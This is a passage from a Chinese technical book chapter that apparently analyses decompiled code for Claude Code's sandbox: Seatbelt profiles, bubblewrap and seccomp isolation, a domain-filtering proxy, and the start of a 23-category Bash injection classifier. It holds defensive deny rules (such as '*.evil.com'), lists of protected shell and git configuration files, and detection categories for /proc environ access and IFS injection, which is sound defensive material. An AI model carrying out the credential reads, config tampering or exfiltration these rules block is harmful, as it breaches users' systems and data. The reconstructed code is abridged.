
# 第 14 章：Sandbox 安全沙箱 — Agent 的安全围栏

> **核心问题**：当一个 AI Agent 可以执行任意 Bash 命令时，如何确保它不会删除用户文件、不会窃取敏感数据、不会向恶意服务器发送信息 — 即使命令本身"看起来无害"？

权限系统（第 13 章）在应用层过滤命令，但它本质上是"逻辑检查" — 依赖规则匹配来判断一条命令是否安全。然而，Bash 命令的组合爆炸使得任何规则系统都无法覆盖所有情况。一条看似无害的 `curl` 命令可能通过管道将敏感文件发送到远程服务器；一条 `npm install` 的 postinstall 脚本可能修改 `.bashrc`。

Claude Code 的解决方案是在权限系统之下增加一层**操作系统级隔离** — Sandbox（安全沙箱）。它不关心命令"想做什么"，而是在内核层面限制命令"能做什么"。即使命令绕过了所有应用层检查，沙箱依然能阻止非法的文件写入和网络访问。

---

## 14.1 概述：为什么 Coding Agent 需要沙箱

传统的安全模型依赖"先审查，再执行" — 检查命令是否在白名单中，然后放行或拒绝。这种模型在 Agent 场景下有三个致命缺陷：

1. **命令组合爆炸**：Bash 命令通过管道、子 shell、环境变量等方式可以无限组合，规则引擎无法穷举所有危险模式
2. **间接执行**：`npm install`、`pip install`、`make` 等命令会触发子进程，这些子进程的行为无法预测
3. **提示注入**：恶意代码库中的注释或文件内容可能诱导 Agent 执行危险命令

Claude Code 的 Sandbox 系统采用**多层防御架构**，在三个层面同时施加约束：

```
┌─────────────────────────────────────────────────────┐
│  Layer 3: Application Layer (Tengu Classifier)      │
│  23 pattern detection for injection/obfuscation     │
├─────────────────────────────────────────────────────┤
│  Layer 2: Permission Layer (allow/deny rules)       │
│  autoAllowBashIfSandboxed auto-approval             │
├─────────────────────────────────────────────────────┤
│  Layer 1: OS Layer (Sandbox Isolation)              │
│  macOS: Seatbelt (sandbox-exec)                     │
│  Linux: Bubblewrap (bwrap) + seccomp BPF            │
│  Network: HTTP/SOCKS5 proxy + domain filtering      │
└─────────────────────────────────────────────────────┘
```

> **设计决策**：沙箱并非取代权限系统，而是与之协同。权限系统提供细粒度的"意图审查"（用户可以选择信任或拒绝某条命令），沙箱提供兜底的"能力限制"（无论命令被允许还是被注入，都无法突破文件系统和网络的边界）。这种"纵深防御"是安全工程的基本原则。

**小结**：Coding Agent 需要沙箱，因为应用层检查无法应对命令组合爆炸、间接执行和提示注入三大威胁。OS 级沙箱提供了不可绕过的最后一道防线。

---

## 14.2 沙箱启用决策链：vC() (shouldEnableSandbox) → TL_() (getSandboxConfig)

沙箱并不是对所有命令都启用的。有些命令（如 `docker`）自带隔离，强行沙箱化反而会导致冲突。Claude Code 通过一条精确的决策链来判断每条命令是否需要沙箱化。

### 14.2.1 命令级决策 — `vC()` (shouldEnableSandbox)

每当 Bash 工具收到一条命令时，首先调用 `vC()` 判断该命令是否需要沙箱化：

```javascript
// modules/15_hooks_system.js, line ~6994
function vC(input) {
  // 1. Global switch: sandbox not enabled → skip
  if (!j8.isSandboxingEnabled()) return false;

  // 2. Explicit disable: dangerouslyDisableSandbox=true
  //    and settings allow unsandboxed commands → skip
  if (input.dangerouslyDisableSandbox &&
      j8.areUnsandboxedCommandsAllowed()) return false;

  // 3. No command → skip
  if (!input.command) return false;

  // 4. Command in excluded list → skip
  if (js1(input.command)) return false;

  // 5. All checks passed → enable sandbox
  return true;
}
```

决策流程可视化：

```
vC(input)
  │
  ├─ sandbox globally disabled? ──── yes ──→ return false
  │
  ├─ dangerouslyDisableSandbox      yes
  │  + allowUnsandboxed?      ────────────→ return false
  │
  ├─ no command?             ──── yes ──→ return false
  │
  ├─ command in excluded?    ──── yes ──→ return false
  │  (e.g. "docker *")
  │
  └─ otherwise              ──────────→ return true (enable sandbox)
```

其中 `js1()` (isCommandExcluded) 用于检查命令是否匹配排除列表。排除列表支持通配符模式（如 `"docker *"` 匹配所有 docker 子命令）：

```javascript
// modules/15_hooks_system.js, line ~6952
// js1() (isCommandExcluded)
// Checks if a command matches any pattern in sandbox.excludedCommands
// Patterns support wildcard "*" matching
```

### 14.2.2 全局启用条件 — `TL_()` (getSandboxConfig)

`vC()` 中调用的 `j8.isSandboxingEnabled()` 最终委托到 `TL_()`，它检查沙箱是否在当前环境中可用：

```javascript
// modules/09_data_processing.js, line ~14551
function TL_() {
  // 1. Platform support (macOS or Linux, not WSL1)
  if (!OL_()) return false;

  // 2. Dependency check (bwrap/socat for Linux, ripgrep for both)
  if ($L_().errors.length > 0) return false;

  // 3. Platform in enabledPlatforms list
  if (!QV6()) return false;

  // 4. Settings: sandbox.enabled = true
  return KL_();  // X8()?.sandbox?.enabled ?? false
}
```

四重门卫的逻辑可以画成一个表格：

| 检查项 | 函数 | 失败原因示例 |
|--------|------|-------------|
| 平台支持 | `OL_()` (isPlatformSupported) | Windows、WSL1 |
| 依赖可用 | `$L_()` (checkDependencies) | 未安装 bwrap 或 socat |
| 平台启用 | `QV6()` (isPlatformEnabled) | enabledPlatforms 不含当前平台 |
| 设置开关 | `KL_()` (isSettingEnabled) | sandbox.enabled = false |

### 14.2.3 关键配置项

沙箱的行为由一组 JSON 配置控制，分布在 5 层设置中（参见第 6 章设置系统）：

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "allowUnsandboxedCommands": true,
    "failIfUnavailable": false,
    "excludedCommands": ["docker *"],
    "enabledPlatforms": ["macos", "linux"],
    "network": {
      "allowedDomains": ["registry.npmjs.org", "*.github.com"],
      "deniedDomains": ["*.evil.com"]
    },
    "filesystem": {
      "allowWrite": ["."],
      "denyWrite": [".git/hooks"],
      "denyRead": [],
      "allowRead": []
    }
  }
}
```

| 配置项 | 默认值 | 说明 |
|--------|--------|------|
| `enabled` | `false` | 全局开关 |
| `autoAllowBashIfSandboxed` | `true` | 沙箱化命令跳过权限弹框 |
| `allowUnsandboxedCommands` | `true` | 允许 `dangerouslyDisableSandbox` |
| `failIfUnavailable` | `false` | 沙箱不可用时是否拒绝执行 |
| `excludedCommands` | `[]` | 排除的命令模式列表 |
| `enabledPlatforms` | `["macos","linux"]` | 启用沙箱的平台 |

> **设计决策**：`failIfUnavailable` 默认为 `false`，这是一个务实的选择。如果设为 `true`，在未安装 bwrap 的 Linux 环境中所有 Bash 命令都会被拒绝，这对用户体验是灾难性的。默认容忍沙箱缺失，同时在安全敏感环境中允许管理员强制要求沙箱。

### 14.2.4 配置构建 — `HL_()` (buildSandboxConfig)

来自 5 层设置的分散配置需要合并为统一的沙箱配置。`HL_()` 承担这个桥接工作：

```javascript
// modules/09_data_processing.js, line ~14394
function HL_(settings) {
  let allowedDomains = [];
  let deniedDomains = [];

  // 1. Network domains: extract from sandbox and permission rules
  //    For managed policy: only from policySettings
  //    For normal mode: from all setting layers
  //    Also extracts domains from WebFetch allow rules:
  //    "WebFetch(domain:example.com)" → allowedDomains.push("example.com")

  // 2. Filesystem: merge paths from all layers
  let allowWrite = [".", homedir()];   // cwd and home by default
  let denyWrite = [...settingsFiles];  // settings files are protected
  let denyRead = [];
  let allowRead = [];

  // Add git-specific protected paths
  for (let gitPath of ["HEAD", "objects", "refs", "hooks", "config"]) {
    denyWrite.push(resolve(gitRoot, gitPath));
  }

  // 3. Collect from all 5 layers
  for (let source of settingLayers) {
    let layerSettings = getSettings(source);
    // Extract Edit allow → allowWrite
    // Extract Edit deny → denyWrite
    // Extract Read deny → denyRead
    // Extract sandbox.filesystem overrides
  }

  return {
    network: { allowedDomains, deniedDomains },
    filesystem: { denyRead, allowRead, allowWrite, denyWrite },
    ignoreViolations: settings.sandbox?.ignoreViolations
  };
}
```

注意几个巧妙之处：

- **权限规则复用**：`Edit(path)` 类型的 allow 规则会自动转化为沙箱的 `allowWrite` 路径，避免用户重复配置
- **Git 目录保护**：`.git/hooks`、`.git/config` 等路径被自动加入 denyWrite，防止恶意命令注入 Git hooks
- **设置文件自保护**：所有设置文件路径被加入 denyWrite，防止命令修改自己的安全策略

**小结**：沙箱启用经过两级决策 — `vC()` 决定单条命令是否沙箱化，`TL_()` 决定全局是否具备沙箱能力。配置构建器 `HL_()` 将 5 层设置合并为统一配置，并巧妙复用权限规则以减少重复配置。

---

## 14.3 macOS Seatbelt SBPL Profile 生成：qu4() (generateSbplProfile)

macOS 沙箱基于 Apple 的 Seatbelt 框架，通过 `sandbox-exec` 命令加载一段 SBPL（Sandbox Profile Language）策略来约束子进程的行为。这是 macOS 独有的 OS 级隔离机制。

### 14.3.1 沙箱包装流程

当一条命令需要沙箱化时，经过以下转换：

```
Original command: npm install
         │
         ▼
Xu4() (buildSandboxWrapper) builds config
         │
         ▼ (macOS path)
esq() (wrapWithSeatbelt) wraps command
         │
         ▼
qu4() (generateSbplProfile) generates SBPL
         │
         ▼
Final: env HTTP_PROXY=... sandbox-exec -p "<profile>" /bin/bash -c "npm install"
```

`Xu4()` (buildSandboxWrapper) 是平台无关的入口，负责准备文件系统和网络配置后分发到平台特定的实现：

```javascript
// modules/09_data_processing.js, line ~13920
async function Xu4(command, shell, overrides, abortSignal) {
  let platform = DG();  // "macos" | "linux"

  // 1. Build write config: allowOnly + denyWithinAllow
  let allowWrite = [...SQH(), ...overrides?.filesystem?.allowWrite ?? defaults.allowWrite];
  let writeConfig = {
    allowOnly: allowWrite,
    denyWithinAllow: overrides?.denyWrite ?? defaults.denyWrite
  };

  // 2. Build read config: denyOnly + allowWithinDeny
  let readConfig = {
    denyOnly: overrides?.filesystem?.denyRead ?? defaults.denyRead,
    allowWithinDeny: overrides?.filesystem?.allowRead ?? []
  };

  // 3. Check if network restriction needed
  let needsNetwork = overrides?.network?.allowedDomains !== undefined;
  if (needsNetwork) await waitForNetworkInitialization();

  // 4. Dispatch by platform
  switch (platform) {
    case "macos": return esq({ command, readConfig, writeConfig, ... });
    case "linux": return isq({ command, readConfig, writeConfig, ... });
    default: throw Error(`Unsupported platform: ${platform}`);
  }
}
```

默认的安全写入路径由 `SQH()` (getDefaultWritePaths) 提供：

```javascript
// modules/09_data_processing.js, line ~12808
function SQH() {
  let home = os.homedir();
  return [
    "/dev/stdout", "/dev/stderr", "/dev/null",
    "/dev/tty", "/dev/dtracehelper", "/dev/autofs_nowait",
    "/tmp/claude", "/private/tmp/claude",
    path.join(home, ".npm/_logs"),
    path.join(home, ".claude/debug")
  ];
}
```

这些路径是所有命令都需要写入的基础设施 — 标准输出/错误、临时目录、日志目录。

### 14.3.2 SBPL Profile 结构 — `qu4()` (generateSbplProfile)

`qu4()` 是整个 macOS 沙箱的核心函数。它生成一段 SBPL 策略文本，定义了进程在沙箱内可以做和不可以做的一切：

```javascript
// modules/09_data_processing.js, line ~13469
function qu4({ readConfig, writeConfig, httpProxyPort, socksProxyPort,
               needsNetworkRestriction, allowUnixSockets, ... }) {
  let profile = [
    "(version 1)",
    '(deny default (with message "<logTag>"))',  // Deny everything by default

    // === Basic process privileges ===
    "(allow process-exec)",       // Allow executing programs
    "(allow process-fork)",       // Allow forking child processes
    "(allow process-info* (target same-sandbox))",  // Process info within sandbox
    "(allow signal (target same-sandbox))",          // Signals within sandbox

    // === Mach IPC (whitelisted services) ===
    "(allow mach-lookup",
    '  (global-name "com.apple.audio.systemsoundserver")',
    '  (global-name "com.apple.fonts")',
    '  (global-name "com.apple.logd")',
    '  (global-name "com.apple.securityd.xpc")',
    // ... ~15 whitelisted macOS services
    ")",

    // === sysctl reads (whitelisted) ===
    "(allow sysctl-read",
    '  (sysctl-name "hw.ncpu")',
    '  (sysctl-name "hw.memsize")',
    '  (sysctl-name "kern.osversion")',
    // ... ~50 whitelisted sysctl entries
    ")",

    // === Device files ===
    '(allow file-ioctl (literal "/dev/null"))',
    '(allow file-ioctl (literal "/dev/random"))',
    '(allow file-ioctl (literal "/dev/urandom"))',
  ];

  // ...network and filesystem rules below
  return profile.join("\n");
}
```

这段策略的第一行 `(deny default)` 是关键 — 它确立了**默认拒绝**的基调，所有权限都必须显式授予。

### 14.3.3 网络控制

网络控制是 SBPL Profile 中最精巧的部分。当需要网络限制时，不是简单地禁止网络，而是只允许连接到本地代理端口：

```javascript
  // === Network control ===
  if (!needsNetworkRestriction) {
    profile.push("(allow network*)");  // No restriction
  } else {
    // Only allow outbound to proxy ports
    if (httpProxyPort) {
      profile.push(
        `(allow network-outbound (remote ip "localhost:${httpProxyPort}"))`
      );
    }
    if (socksProxyPort) {
      profile.push(
        `(allow network-outbound (remote ip "localhost:${socksProxyPort}"))`
      );
    }
    // Unix socket control
    if (allowAllUnixSockets) {
      profile.push(
        '(allow network-outbound (remote unix-socket (path-regex #"^/")))'
      );
    } else if (allowUnixSockets?.length) {
      for (let sock of allowUnixSockets) {
        profile.push(
          `(allow network-outbound (remote unix-socket (subpath ${quote(sock)})))`
        );
      }
    }
  }
```

> **设计决策**：不直接禁止网络，而是强制所有流量走代理。这使得沙箱可以在保留合法网络访问（如 `npm install` 从 registry 下载包）的同时，通过代理层实现域名级别的过滤。这比简单的"允许/禁止网络"要灵活得多。

### 14.3.4 文件系统控制

文件系统控制遵循"读取默认允许 + 黑名单拒绝"和"写入默认拒绝 + 白名单允许"的双向策略：

```javascript
  // === File read control === (Hu4)
  // Default: allow read, then deny specific paths
  profile.push("(allow file-read*)");
  for (let denyPath of readConfig.denyOnly) {
    profile.push(`(deny file-read* (subpath ${quote(denyPath)}))`);
  }
  for (let allowPath of readConfig.allowWithinDeny) {
    profile.push(`(allow file-read* (subpath ${quote(allowPath)}))`);
  }

  // === File write control === (_u4)
  // Default: deny write, only allow specific paths
  for (let allowPath of writeConfig.allowOnly) {
    profile.push(`(allow file-write* (subpath ${quote(allowPath)}))`);
  }
  for (let denyPath of writeConfig.denyWithinAllow) {
    profile.push(`(deny file-write* (subpath ${quote(denyPath)}))`);
  }
```

读取和写入采用了**相反的默认策略**：

```
File Read:                          File Write:
  allow file-read* (default)          (no default allow)
    deny subpath /secret              allow subpath /project
      allow subpath /secret/public      deny subpath /project/.git
```

读取默认开放是因为 Agent 需要广泛读取代码来理解项目；写入默认关闭是因为非授权写入可能造成不可逆损害。

### 14.3.5 违规监控 — `Htq()` (startViolationMonitor)

macOS 上，Seatbelt 的违规事件会被记录到系统日志。`Htq()` 通过 `log stream` 实时捕获这些事件：

```javascript
// modules/09_data_processing.js, line ~13557
function Htq(onViolation, ignoreViolations) {
  // Start macOS log stream listener
  let logProcess = spawn("log", [
    "stream",
    "--predicate", `(eventMessage ENDSWITH "${sandboxTag}")`,
    "--style", "compact"
  ]);

  logProcess.stdout.on("data", (data) => {
    let lines = data.toString().split("\n");
    let violation = lines.find(
      l => l.includes("Sandbox:") && l.includes("deny")
    );

    if (!violation) return;

    // Filter known harmless violations
    if (violation.includes("mDNSResponder")) return;
    if (violation.includes("mach-lookup com.apple.diagnosticd")) return;

    // Filter by ignoreViolations config
    // ...

    onViolation({ line: violation, command, timestamp: new Date() });
  });

  return () => logProcess.kill("SIGTERM");  // Return cleanup function
}
```

违规监控有两个用途：
1. **调试**：开发者可以通过违规日志了解命令试图做什么被阻止的操作
2. **反馈**：违规信息最终会注入到命令的 stderr 中，让 AI 模型"看到"沙箱阻止了什么（详见 14.7 节）

**小结**：macOS 沙箱通过 `sandbox-exec` 加载 SBPL Profile 实现 OS 级隔离。Profile 采用"默认拒绝"策略，显式授权进程权限、Mach IPC、sysctl 读取、文件访问和网络连接。网络控制不是简单禁止，而是强制走代理实现域名过滤。违规监控通过 `log stream` 实时捕获被阻止的操作。

---

## 14.4 Linux Bubblewrap + seccomp 隔离：isq() (generateBwrapArgs)

Linux 沙箱使用完全不同的技术栈：Bubblewrap（`bwrap`）提供命名空间隔离，seccomp BPF 过滤器阻断 Unix socket 直连。

### 14.4.1 实现原理

Bubblewrap 利用 Linux 内核的命名空间（namespace）机制创建轻量级沙箱。与 Docker 类似但更轻量，它不需要守护进程或镜像：

```
Original: npm install
    │
    ▼
isq() (generateBwrapArgs) builds args
    │
    ▼
bwrap --new-session --die-with-parent
  --ro-bind / /                            ← Root filesystem read-only
  --bind /home/user/project /home/user/project  ← Project dir writable
  --ro-bind /dev/null /home/user/.bashrc   ← Mask sensitive files
  --unshare-net                            ← Network namespace isolation
  --bind /tmp/http.sock /tmp/http.sock     ← Bridge proxy socket
  --unshare-pid                            ← PID namespace isolation
  --dev /dev                               ← Fresh /dev mount
  --proc /proc                             ← Fresh /proc mount
  -- /bin/bash -c "socat ... && npm install"
```

### 14.4.2 核心实现 — `isq()` (generateBwrapArgs)

```javascript
// modules/09_data_processing.js, line ~13279
async function isq({
  command, needsNetworkRestriction, httpSocketPath, socksSocketPath,
  readConfig, writeConfig, enableWeakerNestedSandbox,
  allowAllUnixSockets, binShell, ripgrepConfig,
  mandatoryDenySearchDepth, allowGitConfig, seccompConfig, abortSignal
}) {
  let hasReadDeny = readConfig?.denyOnly.length > 0;
  let hasWriteConfig = writeConfig !== undefined;

  // No restrictions at all → return original command
  if (!needsNetworkRestriction && !hasReadDeny && !hasWriteConfig) {
    return command;
  }

  let args = ["--new-session", "--die-with-parent"];

  // === seccomp BPF filter (Unix socket blocking) ===
  let bpfPath;
  if (!allowAllUnixSockets) {
    bpfPath = generateSeccompFilter(seccompConfig);
    // Generates BPF filter to block direct Unix socket usage
    // Prevents processes from bypassing proxy via Unix sockets
  }

  // === Network isolation ===
  if (needsNetworkRestriction) {
    args.push("--unshare-net");  // Create new network namespace

    if (httpSocketPath && socksSocketPath) {
      // Bind bridge sockets into sandbox
      args.push("--bind", httpSocketPath, httpSocketPath);
      args.push("--bind", socksSocketPath, socksSocketPath);

      // Set proxy env vars (internal ports 3128/1080)
      let envVars = cZ_(3128, 1080);
      args.push(...envVars.flatMap(v => ["--setenv", key, value]));
    }
  }

  // === Filesystem mounts === (sI4 function)
  let fsArgs = await sI4(readConfig, writeConfig, ripgrepConfig, ...);
  args.push(...fsArgs);

  // Basic isolation
  args.push("--dev", "/dev");
  args.push("--unshare-pid");
  if (!enableWeakerNestedSandbox) args.push("--proc", "/proc");

  // === Assemble final command ===
  args.push("--", shellPath, "-c");

  if (needsNetworkRestriction && httpSocketPath && socksSocketPath) {
    // Launch socat bridges inside sandbox
    let innerCommand = aI4(httpSocketPath, socksSocketPath, command, bpfPath);
    args.push(innerCommand);
  } else if (bpfPath) {
    // seccomp filter only
    let wrappedCmd = quote([applySeccomp, bpfPath, shell, "-c", command]);
    args.push(wrappedCmd);
  } else {
    args.push(command);
  }

  return quote(["bwrap", ...args]);
}
```

几个关键参数的含义：

| bwrap 参数 | 作用 |
|------------|------|
| `--new-session` | 创建新会话，防止通过 TTY 注入控制父进程 |
| `--die-with-parent` | 父进程退出时自动终止沙箱进程 |
| `--unshare-net` | 创建独立网络命名空间，完全隔离网络 |
| `--unshare-pid` | 创建独立 PID 命名空间，沙箱内看不到宿主进程 |
| `--ro-bind / /` | 将根文件系统只读挂载到沙箱 |
| `--bind src dst` | 将指定路径可写挂载到沙箱 |
| `--dev /dev` | 创建新的 /dev 挂载 |
| `--proc /proc` | 创建新的 /proc 挂载 |

### 14.4.3 文件系统挂载构建 — `sI4()` (buildMountArgs)

`sI4()` 将读写配置转换为 bwrap 的挂载参数。这个函数的逻辑比 macOS 版本更复杂，因为 bwrap 使用挂载覆盖而非策略声明：

```javascript
// modules/09_data_processing.js, line ~13191
async function sI4(readConfig, writeConfig, ripgrepConfig,
                   searchDepth, allowGitConfig, abortSignal) {
  let args = [];

  if (writeConfig) {
    // 1. Default: root filesystem read-only
    args.push("--ro-bind", "/", "/");

    // 2. Allowed write paths → writable bind
    for (let path of writeConfig.allowOnly) {
      let resolved = resolvePath(path);
      if (!fs.existsSync(resolved)) continue;

      // Check symlink safety
      let realPath = fs.realpathSync(resolved);
      if (isSymlinkAttack(resolved, realPath)) continue;

      args.push("--bind", resolved, resolved);
    }

    // 3. Deny within allow → read-only overlay
    let denyPaths = [
      ...writeConfig.denyWithinAllow,
      ...findDangerousFiles(ripgrepConfig, searchDepth)
    ];
    for (let path of denyPaths) {
      if (isWithinAllowed(path, allowedPaths)) {
        args.push("--ro-bind", resolved, resolved);
      }
    }
  } else {
    // No write config → everything writable
    args.push("--bind", "/", "/");
  }

  // 4. Read deny paths
  for (let denyPath of readConfig.denyOnly) {
    if (isDirectory(denyPath)) {
      args.push("--tmpfs", denyPath);  // Mask directory with tmpfs
      // Re-allow specific sub-paths within masked directory
      for (let allowPath of readConfig.allowWithinDeny) {
        if (allowPath.startsWith(denyPath + "/")) {
          args.push("--ro-bind", allowPath, allowPath);
        }
      }
    } else {
      args.push("--ro-bind", "/dev/null", denyPath);  // Mask file
    }
  }

  return args;
}
```

Linux 的文件遮蔽使用了两种技术：
- **目录**：用 `--tmpfs` 创建一个空的临时文件系统覆盖目标目录
- **文件**：用 `--ro-bind /dev/null <path>` 将 `/dev/null` 绑定到目标文件，读取时返回空内容

> **设计决策**：符号链接安全检查 `isSymlinkAttack()` 是一个重要的安全措施。攻击者可能创建一个指向 `/etc/passwd` 的符号链接 `./innocent_file`，如果沙箱将 `./innocent_file` 标记为可写，实际上就等于允许写入 `/etc/passwd`。通过比较 `resolvePath()` 和 `realpathSync()` 的结果，可以检测这种攻击。

### 14.4.4 危险文件自动检测

系统维护了一份硬编码的危险文件列表，这些文件在任何情况下都不允许沙箱内的命令写入：

```javascript
// modules/09_data_processing.js, line ~12868
VQH = [
  ".gitconfig", ".gitmodules",       // Git config
  ".bashrc", ".bash_profile",        // Shell config
  ".zshrc", ".zprofile", ".profile",
  ".ripgreprc",                      // ripgrep config
  ".mcp.json"                        // MCP config
];

UI4 = [".git", ".vscode", ".idea"];  // IDE/VCS directories

// dZ_() (getExtraDenyPaths) returns additional deny paths
function dZ_() {
  return [
    ...UI4.filter(p => p !== ".git"),
    ".claude/commands",
    ".claude/agents"
  ];
}
```

此外，`ripgrep` 会在项目目录中扫描可能被攻击利用的文件（搜索深度由 `mandatoryDenySearchDepth` 控制，默认 3 层）。这意味着即使攻击者在子目录中放置了 `.bashrc` 文件，沙箱也会自动保护它。

**小结**：Linux 沙箱通过 Bubblewrap 的命名空间隔离实现文件系统和网络的强隔离。文件系统控制使用挂载覆盖（`--ro-bind`、`--tmpfs`），网络隔离使用独立网络命名空间 + Unix socket 桥接。seccomp BPF 过滤器防止进程绕过代理直连。危险文件（`.bashrc`、`.gitconfig` 等）被自动加入写入拒绝列表。

---

## 14.5 网络代理架构：域名过滤 Otq() (filterDomains)

沙箱的网络控制不是简单的"允许/禁止网络" — 那样会让 `npm install` 等合法操作也无法工作。Claude Code 采用了一个代理架构，让所有网络流量都经过一个可控的中间层。

### 14.5.1 代理层级架构

```
┌──────────────── Inside Sandbox ────────────────┐
│                                                 │
│  Command: npm install                           │
│    │                                            │
│    ├─ HTTP_PROXY=http://localhost:3128           │
│    ├─ HTTPS_PROXY=http://localhost:3128          │
│    ├─ ALL_PROXY=socks5h://localhost:1080         │
│    │                                            │
│    ▼                                            │
│  socat TCP-LISTEN:3128 <-> UNIX:http.sock       │ (Linux only)
│  socat TCP-LISTEN:1080 <-> UNIX:socks.sock      │
│                                                 │
└────────┬────────────────────────┬───────────────┘
         │ Unix socket            │
         ▼                        ▼
┌──────────────── Host Environment ──────────────┐
│                                                 │
│  HTTP Proxy Server - Tu4() (startHttpProxy)     │
│    └─ Domain filter: Otq() (filterDomains)      │
│         ├─ deniedDomains  → reject              │
│         ├─ allowedDomains → allow               │
│         └─ no match       → askCallback (prompt) │
│                                                 │
│  SOCKS5 Proxy Server - zu4() (startSocksProxy)  │
│    └─ Same domain filtering logic               │
│                                                 │
└────────────────────┬────────────────────────────┘
                     │
                     ▼
                  Internet
```

### 14.5.2 代理初始化 — `Au4()` (initializeSandbox)

整个沙箱系统的初始化由 `Au4()` 统筹：

```javascript
// modules/09_data_processing.js, line ~13728
async function Au4(config, permissionCallback, enableMonitor) {
  I4 = config;  // Save sandbox config

  // 1. Check dependencies
  let deps = checkDependencies();
  if (deps.errors.length > 0) throw Error(`Dependencies not available`);

  // 2. macOS: start violation monitor
  if (enableMonitor && platform === "macos") {
    stopMonitor = Htq(violationStore.addViolation, config.ignoreViolations);
  }

  // 3. Register cleanup callback (on process exit)
  registerCleanup();

  // 4. Initialize network proxies
  let httpPort = config.network.httpProxyPort
    ? config.network.httpProxyPort       // Use external proxy
    : await Tu4(permissionCallback);     // Start built-in HTTP proxy

  let socksPort = config.network.socksProxyPort
    ? config.network.socksProxyPort      // Use external proxy
    : await zu4(permissionCallback);     // Start built-in SOCKS proxy

  // 5. Linux: create socat bridge
  if (platform === "linux") {
    linuxBridge = await lsq(httpPort, socksPort);
  }
}
```

### 14.5.3 Linux 的 socat 桥接

Linux 沙箱使用 `--unshare-net` 创建独立网络命名空间后，沙箱内的进程无法连接宿主的 localhost。解决方案是通过 Unix socket 桥接：

```
Sandbox (network namespace A)       Host (network namespace B)
┌───────────────────────┐           ┌───────────────────────┐
│                       │           │                       │
│ socat                 │           │                       │
│ TCP-LISTEN:3128       │           │  HTTP Proxy (:3128)   │
│   ↕ (forward)         │           │     ↑                 │
│ UNIX:/tmp/http.sock ──┼───────────┼─────┘                 │
│                       │  (shared  │                       │
│ socat                 │   Unix    │  SOCKS Proxy (:1080)  │
│ TCP-LISTEN:1080       │  socket)  │     ↑                 │
│   ↕ (forward)         │           │     │                 │
│ UNIX:/tmp/socks.sock ─┼───────────┼─────┘                 │
│                       │           │                       │
└───────────────────────┘           └───────────────────────┘
```

macOS 不需要这个桥接层，因为 Seatbelt 直接在策略中允许连接 `localhost:port`，不创建独立网络命名空间。

### 14.5.4 域名过滤 — `Otq()` (filterDomains)

所有出站网络请求最终都会经过域名过滤：

```javascript
// modules/09_data_processing.js, line ~13667
async function Otq(port, host, askCallback) {
  if (!config) return false;  // No config → reject

  // 1. Check denied list
  for (let domain of config.network.deniedDomains) {
    if (matchDomain(host, domain)) return false;
  }

  // 2. Check allowed list
  for (let domain of config.network.allowedDomains) {
    if (matchDomain(host, domain)) return true;
  }

  // 3. No match → ask user
  if (!askCallback) return false;
  return await askCallback({ host, port });
}

// Domain matching supports wildcards
function matchDomain(host, pattern) {
  if (pattern.startsWith("*.")) {
    let suffix = pattern.substring(2);
    return host.toLowerCase().endsWith("." + suffix.toLowerCase());
  }
  return host.toLowerCase() === pattern.toLowerCase();
}
```

决策优先级：**拒绝列表 > 允许列表 > 用户确认**。这确保了即使允许列表中包含某个域名，如果它同时在拒绝列表中，也会被拒绝。

### 14.5.5 环境变量注入 — `cZ_()` (generateProxyEnvVars)

沙箱内的命令通过环境变量发现代理：

```javascript
// modules/09_data_processing.js, line ~12813
function cZ_(httpPort, socksPort) {
  let env = [
    "SANDBOX_RUNTIME=1",
    `TMPDIR=${process.env.CLAUDE_TMPDIR || "/tmp/claude"}`
  ];

  // Local addresses bypass proxy
  let noProxy = "localhost,127.0.0.1,::1,*.local,.local,169.254.0.0/16,...";
  env.push(`NO_PROXY=${noProxy}`, `no_proxy=${noProxy}`);

  if (httpPort) {
    env.push(`HTTP_PROXY=http://localhost:${httpPort}`);
    env.push(`HTTPS_PROXY=http://localhost:${httpPort}`);
    env.push(`http_proxy=http://localhost:${httpPort}`);
    env.push(`https_proxy=http://localhost:${httpPort}`);
  }

  if (socksPort) {
    env.push(`ALL_PROXY=socks5h://localhost:${socksPort}`);
    // Git SSH also goes through proxy
    if (platform === "macos") {
      env.push(`GIT_SSH_COMMAND=ssh -o ProxyCommand='nc -X 5 -x localhost:${socksPort} %h %p'`);
    } else if (platform === "linux") {
      env.push(`GIT_SSH_COMMAND=ssh -o ProxyCommand='socat - PROXY:localhost:%h:%p,proxyport=${httpPort}'`);
    }
    // Docker, gRPC, FTP, rsync proxy
    env.push(`DOCKER_HTTP_PROXY=http://localhost:${httpPort}`);
    env.push(`GRPC_PROXY=socks5h://localhost:${socksPort}`);
  }

  return env;
}
```

注意环境变量同时设置了大写和小写版本（`HTTP_PROXY` 和 `http_proxy`），因为不同工具检查的变量名不同。`GIT_SSH_COMMAND` 确保 `git push/pull` 走 SSH 时也被代理拦截。

**小结**：网络代理架构通过 HTTP/SOCKS5 双代理拦截所有出站流量，配合域名过滤实现细粒度网络控制。Linux 通过 socat + Unix socket 桥接解决网络命名空间隔离后的代理连通性问题。环境变量注入覆盖了 HTTP、HTTPS、SOCKS、Git SSH、Docker、gRPC 等所有常见协议。

---

## 14.6 Tengu 安全分类器：23 类 Bash 命令检测模式

沙箱在 OS 层面限制了命令"能做什么"，但有些攻击在沙箱内也可能造成危害（如消耗计算资源、读取沙箱内可访问的敏感数据）。Tengu 安全分类器是应用层的补充检测，在命令进入沙箱之前识别潜在的注入和混淆模式。

### 14.6.1 检测类别枚举

Tengu 定义了 23 种检测类别，覆盖了从命令注入到编码混淆的各种攻击向量：

```javascript
// modules/11_api_streaming.js, line ~13327
Q1 = {
  INCOMPLETE_COMMANDS: 1,            // Incomplete (starts with tab/flag/delimiter)
  JQ_SYSTEM_FUNCTION: 2,            // jq system() call
  JQ_FILE_ARGUMENTS: 3,             // jq file arguments (-f, --rawfile)
  OBFUSCATED_FLAGS: 4,              // Obfuscated flag arguments
  SHELL_METACHARACTERS: 5,          // Shell metachar injection (;|&)
  DANGEROUS_VARIABLES: 6,           // Dangerous vars in redirect/pipe
  NEWLINES: 7,                      // Newlines in command
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,  // Dangerous cmd substitution
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,     // Input redirect attack
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,   // Output redirect attack
  IFS_INJECTION: 11,                // IFS variable injection
  GIT_COMMIT_SUBSTITUTION: 12,      // cmd substitution in git commit -m
  PROC_ENVIRON_ACCESS: 13,          // /proc/*/environ access
  MALFORMED_TOKEN_INJECTION: 14,    // Malformed token injection
